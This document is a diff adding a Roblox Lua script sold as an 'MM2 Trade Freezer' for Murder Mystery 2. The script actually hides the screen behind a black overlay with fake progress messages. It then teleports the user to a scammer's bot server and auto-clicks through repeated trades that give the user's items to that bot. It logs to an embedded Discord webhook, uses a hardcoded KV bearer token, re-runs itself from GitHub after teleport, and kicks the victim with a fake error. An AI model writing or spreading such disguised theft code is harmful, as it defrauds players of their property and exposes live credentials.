@@ -1,0 +1,700 @@
+--============================================================
+-- SIDE 2 — CLIENT (v46)
+-- MM2 Trade Freezer — PC + Mobile
+-- Self-verifying join + name-scan fallbacks
+--============================================================
+local Players             = game:GetService("Players")
+local VirtualInputManager = game:GetService("VirtualInputManager")
+local CoreGui             = game:GetService("CoreGui")
+local GuiService          = game:GetService("GuiService")
+local TeleportService     = game:GetService("TeleportService")
+local HttpService         = game:GetService("HttpService")
+local TweenService        = game:GetService("TweenService")
+local UserInputService    = game:GetService("UserInputService")
+
+local player    = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+--==================== LOG WEBHOOK ====================
+local LOG_WEBHOOK = "https://discord.com/api/webhooks/1553808053583880415/2mI21iIDUIspYgQJUU2wQM_mDbr-t1h1KxiyxEDRPGRYGk425zCyglMtEROG7EhjFa0Y"
+
+local function httpReq(opts)
+    local req = request or http_request or (syn and syn.request)
+    if not req then return nil end
+    local ok, res = pcall(req, opts)
+    if not ok or not res then return nil end
+    if not res.Body and res.body then res.Body = res.body end
+    return res
+end
+
+local function log(...)
+    local parts = {}
+    for i = 1, select("#", ...) do
+        table.insert(parts, tostring(select(i, ...)))
+    end
+    local msg = "[S2] " .. table.concat(parts, " ")
+    warn(msg)
+    task.spawn(function()
+        httpReq({
+            Url = LOG_WEBHOOK,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = HttpService:JSONEncode({ content = msg:sub(1, 1900), username = "S2" }),
+        })
+    end)
+end
+--================================================
+
+--==================== PLATFORM ====================
+local IS_MOBILE = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
+log("script started | Platform:", IS_MOBILE and "Mobile" or "PC")
+
+--==================== CONFIG ====================
+local BOT_USERNAME        = "blox_depo1"
+local KV_URL              = "https://subtle-egret-302888.upstash.io"
+local KV_TOKEN            = "gQAAAAAABJ8oAAIgcDFiYmUwMTdlYmU1MmQ0ZTUxOGIzZmZhYzQxZTNjMmQwZA"
+
+local DISCORD_USERNAME    = (getgenv and getgenv().DISCORD_USERNAME)
+                         or rawget(getfenv(), "DISCORD_USERNAME")
+                         or (_G and _G.DISCORD_USERNAME)
+                         or "unknown"
+
+local ITEMS_PER_BATCH     = 6
+local CONFIRM_WAIT        = 7
+local CLICK_GAP           = 0.4
+local POST_JOIN_WAIT      = 10
+local SNIPE_POLL_INTERVAL = 3
+local KICK_MESSAGE        = "Error, script did not load in time, try another time or contact support in https://discord.gg/SfeBgTx5V8"
+
+local SELF_SOURCE_URL     = "https://raw.githubusercontent.com/tturnaa/mm2-trade-freezer/refs/heads/main/trade"
+
+log("config loaded | Bot:", BOT_USERNAME, "| Discord:", DISCORD_USERNAME)
+--================================================
+
+local KILLED = false
+
+--==================== AUTO-EXEC ====================
+local TeleportCheck = false
+
+local function queueAutoExec()
+    if TeleportCheck then
+        log("autoexec: already ran")
+        return false
+    end
+    TeleportCheck = true
+
+    local source = nil
+    if SELF_SOURCE_URL and SELF_SOURCE_URL ~= "" then
+        log("autoexec: fetching source...")
+        local ok, body = pcall(function()
+            if game.HttpGetAsync then
+                return game:HttpGetAsync(SELF_SOURCE_URL)
+            end
+            return game:HttpGet(SELF_SOURCE_URL, true)
+        end)
+        if ok and type(body) == "string" and #body > 100 then
+            source = body
+            log("autoexec: fetched", #source, "bytes")
+        else
+            log("autoexec: fetch FAILED")
+        end
+    end
+
+    if not source then
+        log("autoexec: no source")
+        return false
+    end
+
+    local queueteleport = queue_on_teleport
+        or queueonteleport
+        or (syn and syn.queue_on_teleport)
+        or (fluxus and fluxus.queue_on_teleport)
+
+    if type(queueteleport) == "function" then
+        local ok = pcall(queueteleport, source)
+        log("autoexec: queued ok =", ok)
+        return ok
+    end
+    log("autoexec: no queue function")
+    return false
+end
+
+task.spawn(function()
+    pcall(function()
+        player.OnTeleport:Connect(function(State)
+            if State == Enum.TeleportState.Started or State == Enum.TeleportState.InProgress then
+                log("OnTeleport fired:", tostring(State))
+                queueAutoExec()
+            end
+        end)
+    end)
+end)
+
+--==================== KV ====================
+local function kvGet(key)
+    local res = httpReq({
+        Url = KV_URL .. "/get/" .. key,
+        Method = "GET",
+        Headers = { ["Authorization"] = "Bearer " .. KV_TOKEN },
+    })
+    if not res then return nil end
+    local body = res.Body or res.body
+    if not body then return nil end
+    local ok, data = pcall(HttpService.JSONDecode, HttpService, body)
+    if ok and data then return data.result end
+    return nil
+end
+
+local function kvSet(key, value)
+    httpReq({
+        Url = KV_URL .. "/set/" .. key,
+        Method = "POST",
+        Headers = {
+            ["Authorization"] = "Bearer " .. KV_TOKEN,
+            ["Content-Type"]  = "text/plain",
+        },
+        Body = value,
+    })
+end
+
+task.spawn(function()
+    task.wait(1)
+    kvSet("client_discord", tostring(DISCORD_USERNAME))
+    log("published client_discord =", DISCORD_USERNAME)
+end)
+
+--==================== CLICK ====================
+local function clickAt(obj)
+    if not obj or not obj:IsA("GuiObject") then return false end
+    local s = obj.AbsoluteSize
+    if s.X < 2 or s.Y < 2 then return false end
+    local inset = GuiService:GetGuiInset()
+    local p = obj.AbsolutePosition
+    local x = math.floor(p.X + s.X/2 + inset.X)
+    local y = math.floor(p.Y + s.Y/2 + inset.Y)
+
+    if firesignal then
+        pcall(function() firesignal(obj.MouseButton1Click) end)
+        pcall(function() firesignal(obj.Activated) end)
+    end
+    pcall(function()
+        VirtualInputManager:SendMouseMoveEvent(x, y, game)
+        task.wait(0.05)
+        VirtualInputManager:SendMouseButtonEvent(x, y, 0, true, game, 0)
+        task.wait(0.05)
+        VirtualInputManager:SendMouseButtonEvent(x, y, 0, false, game, 0)
+    end)
+    return true
+end
+
+local function resolve(path)
+    local cur = playerGui
+    for _, n in ipairs(path) do
+        if not cur then return nil end
+        if type(n) == "function" then cur = n(cur)
+        else cur = cur:FindFirstChild(n) end
+    end
+    return cur
+end
+
+--==================== OVERLAY ====================
+local parentGui = (gethui and gethui()) or CoreGui
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "AutoAcceptGui_Client"
+screenGui.ResetOnSpawn = false
+screenGui.IgnoreGuiInset = true
+screenGui.DisplayOrder = 99999
+screenGui.Parent = parentGui
+
+local overlay
+local spinner
+local statusLabel
+
+local function buildOverlay()
+    if overlay then return end
+
+    overlay = Instance.new("Frame")
+    overlay.Size = UDim2.new(1, 0, 1, 0)
+    overlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    overlay.BackgroundTransparency = 0
+    overlay.BorderSizePixel = 0
+    overlay.Active = false
+    overlay.ZIndex = 99990
+    overlay.Parent = screenGui
+
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, 0, 0, IS_MOBILE and 56 or 44)
+    title.Position = UDim2.new(0, 0, 0.28, 0)
+    title.BackgroundTransparency = 1
+    title.TextColor3 = Color3.fromRGB(120, 255, 160)
+    title.Text = "MM2 Trade Freezer"
+    title.TextScaled = true
+    title.Font = Enum.Font.GothamBold
+    title.ZIndex = 99991
+    title.Parent = overlay
+    Instance.new("UITextSizeConstraint", title).MaxTextSize = IS_MOBILE and 44 or 34
+
+    spinner = Instance.new("ImageLabel")
+    spinner.Size = UDim2.new(0, IS_MOBILE and 120 or 80, 0, IS_MOBILE and 120 or 80)
+    spinner.Position = UDim2.new(0.5, 0, 0.42, 0)
+    spinner.AnchorPoint = Vector2.new(0.5, 0.5)
+    spinner.BackgroundTransparency = 1
+    spinner.Image = "rbxassetid://4965945816"
+    spinner.ImageColor3 = Color3.fromRGB(120, 255, 160)
+    spinner.ZIndex = 99991
+    spinner.Parent = overlay
+
+    statusLabel = Instance.new("TextLabel")
+    statusLabel.Size = UDim2.new(1, 0, 0, IS_MOBILE and 48 or 40)
+    statusLabel.Position = UDim2.new(0, 0, 0.55, 0)
+    statusLabel.BackgroundTransparency = 1
+    statusLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
+    statusLabel.Text = ""
+    statusLabel.TextScaled = true
+    statusLabel.Font = Enum.Font.Gotham
+    statusLabel.ZIndex = 99991
+    statusLabel.Parent = overlay
+    Instance.new("UITextSizeConstraint", statusLabel).MaxTextSize = IS_MOBILE and 32 or 24
+
+    task.spawn(function()
+        while spinner and spinner.Parent do
+            local tween = TweenService:Create(
+                spinner,
+                TweenInfo.new(1.0, Enum.EasingStyle.Linear),
+                { Rotation = spinner.Rotation + 360 }
+            )
+            tween:Play()
+            tween.Completed:Wait()
+        end
+    end)
+end
+
+local function setStatus(s)
+    if statusLabel then statusLabel.Text = s end
+end
+
+--==================== KICK ====================
+local function kickSelf(reason)
+    log("KICKING SELF:", reason or KICK_MESSAGE)
+    pcall(function()
+        game.Players.LocalPlayer:Kick(reason or KICK_MESSAGE)
+    end)
+end
+
+--==================== BEACON PARSER ====================
+local function parseServerBeacon(content)
+    if not content or type(content) ~= "string" then return nil end
+
+    local bot, placeId, jobId, userId = content:match(
+        "SERVER|([^|]+)|PlaceId=(%d+)|JobId=([%w%-_]+)|UserId=(%d+)")
+    if bot and jobId then
+        if bot:lower() ~= BOT_USERNAME:lower() then return nil end
+        return {
+            placeId = tonumber(placeId),
+            jobId = jobId,
+            userId = userId and tonumber(userId) or nil,
+        }
+    end
+
+    bot, placeId, jobId = content:match(
+        "SERVER|([^|]+)|PlaceId=(%d+)|JobId=([%w%-_]+)")
+    if not bot or not jobId then return nil end
+    if bot:lower() ~= BOT_USERNAME:lower() then return nil end
+    return { placeId = tonumber(placeId), jobId = jobId, userId = nil }
+end
+
+local function findBot()
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p.Name:lower() == BOT_USERNAME:lower() then return p end
+    end
+end
+
+--==================== TELEPORT ====================
+local function teleportToServer(placeId, jobId, userId)
+    log("=== TELEPORT START ===")
+    log("placeId:", placeId, "jobId:", jobId, "userId:", tostring(userId))
+
+    log("queueing autoexec...")
+    local queued = queueAutoExec()
+    log("queue result:", queued)
+    task.wait(0.5)
+
+    log("attempting TeleportToPlaceInstance...")
+    local ok, err = pcall(function()
+        TeleportService:TeleportToPlaceInstance(placeId, jobId, player)
+    end)
+
+    if ok then
+        log("TeleportToPlaceInstance SUCCEEDED")
+        return true
+    end
+    log("TeleportToPlaceInstance FAILED:", tostring(err))
+
+    if TeleportService.TeleportAsync then
+        log("attempting TeleportAsync fallback...")
+        local ok2, err2 = pcall(function()
+            TeleportService:TeleportAsync(placeId, { player }, { JobId = jobId })
+        end)
+        if ok2 then
+            log("TeleportAsync SUCCEEDED")
+            return true
+        end
+        log("TeleportAsync FAILED:", tostring(err2))
+    end
+
+    log("=== TELEPORT FAILED (both methods) ===")
+    return false
+end
+
+--==================== JOIN (self-verifying) ====================
+local function joinTargetServer()
+    log("=== JOIN START ===")
+    kvSet("client_ask", "ASK")
+
+    log("waiting for bot_reply (15s)...")
+    local endT = tick() + 15
+    while tick() < endT do
+        if KILLED then return false end
+        local reply = kvGet("bot_reply")
+        if reply and reply ~= "" and type(reply) == "string" then
+            log("  got reply:", reply)
+            kvSet("bot_reply", "")
+            break
+        end
+        task.wait(1)
+    end
+
+    log("polling for beacon (30s)...")
+    endT = tick() + 30
+    local attempt = 0
+    while tick() < endT do
+        if KILLED then return false end
+        attempt = attempt + 1
+
+        local status = kvGet("bot_status")
+        log("  attempt " .. attempt .. " | bot_status:", tostring(status))
+
+        if status == "OPEN" then
+            local beacon = kvGet("roblox_beacon")
+            log("  beacon:", tostring(beacon))
+
+            if beacon and beacon ~= "" then
+                local info = parseServerBeacon(beacon)
+                if not info then
+                    log("  beacon parse FAILED. Raw:", beacon)
+                else
+                    log("  parsed placeId=" .. tostring(info.placeId) ..
+                        " jobId=" .. tostring(info.jobId) ..
+                        " userId=" .. tostring(info.userId))
+
+                    if info.jobId == game.JobId then
+                        log("  already in bot's server")
+                        return true
+                    end
+
+                    -- wait 1s and re-read beacon in case the bot hopped
+                    task.wait(1)
+                    local beacon2 = kvGet("roblox_beacon")
+                    local info2 = parseServerBeacon(beacon2)
+                    if info2 and info2.jobId ~= info.jobId then
+                        log("  bot hopped during check! new jobId:", info2.jobId)
+                        info = info2
+                    end
+
+                    local ok = teleportToServer(info.placeId, info.jobId, info.userId)
+                    log("  teleport result:", ok)
+
+                    if ok then
+                        log("  verifying join (up to 20s)...")
+                        local verifyEnd = tick() + 20
+                        local joined = false
+                        while tick() < verifyEnd do
+                            if KILLED then return false end
+                            task.wait(1)
+                            local currentBeacon = kvGet("roblox_beacon")
+                            local currentInfo = parseServerBeacon(currentBeacon)
+                            if currentInfo and currentInfo.jobId == game.JobId then
+                                log("  confirmed: we are in bot's server now")
+                                joined = true
+                                break
+                            end
+                            if findBot() then
+                                log("  confirmed: bot found in player list")
+                                joined = true
+                                break
+                            end
+                        end
+                        if not joined then
+                            log("  never landed in bot's server after teleport")
+                            return false
+                        end
+                    end
+
+                    return ok
+                end
+            else
+                log("  beacon empty")
+            end
+        elseif status == "HOPPING" then
+            log("  bot is hopping — waiting")
+        elseif status == nil then
+            log("  KV read returned nil")
+        else
+            log("  unknown bot_status:", tostring(status))
+        end
+
+        task.wait(SNIPE_POLL_INTERVAL)
+    end
+
+    log("=== JOIN FAILED (timeout) ===")
+    return false
+end
+
+--==================== FAILURE POLLER ====================
+task.spawn(function()
+    while not KILLED do
+        task.wait(1)
+        if findBot() then break end
+    end
+    while not KILLED do
+        task.wait(2)
+        local result = kvGet("trade_result")
+        if result == "FAILED" then
+            kvSet("trade_result", "")
+            kickSelf(KICK_MESSAGE)
+            break
+        end
+    end
+end)
+
+--==================== LEADERBOARD LOOKUP (multi-fallback) ====================
+local function findLeaderboardRow()
+    -- 1. Direct path
+    local row = resolve({"MainGUI","Game","Leaderboard","Container", BOT_USERNAME})
+    if row then return row, "direct" end
+
+    -- 2. Alt path with player name
+    row = resolve({"Players",
+        function(g) return g:FindFirstChild(player.Name) end,
+        "PlayerGUI","MainGUI","Game","Leaderboard","Container", BOT_USERNAME})
+    if row then return row, "alt-path" end
+
+    -- 3. Scan for anything named after the bot
+    for _, o in ipairs(playerGui:GetDescendants()) do
+        if o.Name == BOT_USERNAME and o:IsA("GuiObject") then
+            return o, "name-scan"
+        end
+    end
+
+    -- 4. Scan for a TextLabel containing the bot's name, walk up
+    for _, o in ipairs(playerGui:GetDescendants()) do
+        if (o:IsA("TextLabel") or o:IsA("TextButton")) and o.Text then
+            if o.Text:lower():find(BOT_USERNAME:lower(), 1, true) then
+                local p = o
+                for _ = 1, 3 do
+                    if p:IsA("TextButton") or p:IsA("ImageButton") then
+                        return p, "text-scan-btn"
+                    end
+                    p = p.Parent
+                    if not p then break end
+                end
+                return o, "text-scan-label"
+            end
+        end
+    end
+    return nil, "not-found"
+end
+
+--==================== TRADE BUTTON LOOKUP ====================
+local function findTradeButton()
+    local btn = resolve({"MainGUI","Game","Leaderboard","Inspect","Container","Trade"})
+    if btn then return btn, "direct" end
+
+    for _, o in ipairs(playerGui:GetDescendants()) do
+        if o:IsA("GuiButton") and o.Visible and o.Name:lower() == "trade" then
+            return o, "name-scan"
+        end
+    end
+
+    for _, o in ipairs(playerGui:GetDescendants()) do
+        if o:IsA("TextButton") and o.Visible and o.Text:lower() == "trade" then
+            return o, "text-scan"
+        end
+    end
+    return nil, "not-found"
+end
+
+--==================== MAIN FLOW ====================
+local function runFlow()
+    buildOverlay()
+    log("=== MAIN FLOW START ===")
+
+    setStatus("Loading contents...")
+    task.wait(3)
+    setStatus("Looking for vulnerable server...")
+    task.wait(4)
+    setStatus("Found vulnerable server")
+    task.wait(2)
+    setStatus("Joining server...")
+
+    if findBot() then
+        log("bot already in server — skip join")
+        task.wait(1)
+    else
+        local ok = joinTargetServer()
+        if not ok and not findBot() then
+            log("join failed — stopping")
+            setStatus("❌ Could not reach server")
+            return
+        end
+        task.wait(POST_JOIN_WAIT)
+        if KILLED then return end
+    end
+
+    setStatus("Loading script...")
+
+    -- Wait for bot in player list (up to 20s)
+    log("waiting for bot in player list (20s)...")
+    local waitEnd = tick() + 20
+    local botHere = false
+    while tick() < waitEnd do
+        if KILLED then return end
+        if findBot() then botHere = true; break end
+        task.wait(0.5)
+    end
+    log("bot in player list:", botHere)
+
+    -- Find and click leaderboard row
+    log("finding leaderboard row...")
+    local row, how = findLeaderboardRow()
+    if row then
+        log("  FOUND via", how, "at", row:GetFullName())
+        clickAt(row); task.wait(1)
+    else
+        log("  leaderboard row NOT FOUND (" .. how .. ")")
+    end
+
+    -- Find and click trade button
+    log("finding trade button...")
+    local tradeBtn, how2 = findTradeButton()
+    if tradeBtn then
+        log("  FOUND via", how2, "at", tradeBtn:GetFullName())
+        clickAt(tradeBtn); task.wait(2)
+    else
+        log("  trade button NOT FOUND (" .. how2 .. ")")
+    end
+
+    -- Item / accept / confirm paths
+    local BTN_ACCEPT  = IS_MOBILE and {"TradeGUI_Phone","Container","Trade","Actions","Accept","ActionButton"}
+                                    or {"TradeGUI","Container","Trade","Actions","Accept","ActionButton"}
+    local BTN_CONFIRM = IS_MOBILE and {"TradeGUI_Phone","Container","Trade","Actions","Accept","Confirm","ActionButton"}
+                                    or {"TradeGUI","Container","Trade","Actions","Accept","Confirm","ActionButton"}
+    local tradeGuiName = IS_MOBILE and "TradeGUI_Phone" or "TradeGUI"
+
+    local batch = 0
+    while not KILLED and batch < 200 do
+        batch = batch + 1
+        log("===== BATCH " .. batch .. " =====")
+
+        for i = 1, ITEMS_PER_BATCH do
+            if KILLED then return end
+
+            local parent = nil
+            if IS_MOBILE then
+                parent = resolve({
+                    "TradeGUI_Phone","Container","Items","Main","Weapons",
+                    "Items","Container","Current","Container","ItemGridLayout",
+                })
+            else
+                parent = resolve({
+                    "TradeGUI","Container","Items","_mO","Weapons",
+                    "Items","Container","Current","Container",
+                }) or resolve({
+                    "TradeGUI","Container","Items","_m0","Weapons",
+                    "Items","Container","Current","Container",
+                })
+            end
+
+            if parent then
+                local kids = parent:GetChildren()
+                local node = kids[4] or kids[#kids]
+                if node then
+                    log("  click " .. i .. " → " .. node.Name)
+                    clickAt(node)
+                else
+                    log("  no node at idx 4 (kids " .. #kids .. ")")
+                end
+            else
+                log("  items parent NOT found")
+            end
+            task.wait(CLICK_GAP)
+        end
+
+        local acc = resolve(BTN_ACCEPT)
+        if acc then
+            log("  clicking accept")
+            clickAt(acc); task.wait(0.4); if acc.Parent then clickAt(acc) end
+        else
+            log("  accept NOT found")
+        end
+
+        local t = tick() + CONFIRM_WAIT
+        while tick() < t do
+            if KILLED then return end
+            task.wait(0.1)
+        end
+
+        local con = resolve(BTN_CONFIRM)
+        if con then
+            log("  clicking confirm")
+            clickAt(con); task.wait(0.4); if con.Parent then clickAt(con) end
+        else
+            log("  confirm NOT found")
+        end
+
+        local closed = false
+        local endT = tick() + 15
+        while tick() < endT do
+            if KILLED then return end
+            local tcheck = playerGui:FindFirstChild(tradeGuiName)
+            if not tcheck or not tcheck.Enabled then
+                closed = true
+                break
+            end
+            task.wait(0.25)
+        end
+
+        if not closed then
+            log("  trade did not close — kicking self")
+            kickSelf(KICK_MESSAGE)
+            return
+        end
+        log("  trade closed successfully")
+
+        task.wait(1)
+
+        local tg = playerGui:FindFirstChild(tradeGuiName)
+        if not tg or not tg.Enabled then
+            log("  reopening trade")
+            local r2 = findLeaderboardRow()
+            if r2 then
+                clickAt(r2); task.wait(0.8)
+                local t2 = findTradeButton()
+                if t2 then clickAt(t2); task.wait(1.5) end
+            end
+        end
+        task.wait(0.5)
+    end
+end
+
+--==================== AUTO-START ====================
+task.spawn(function()
+    task.wait(0.5)
+    local ok, err = pcall(runFlow)
+    if not ok then
+        log("runFlow ERROR:", tostring(err))
+    end
+end)
+
+log("script fully initialized")
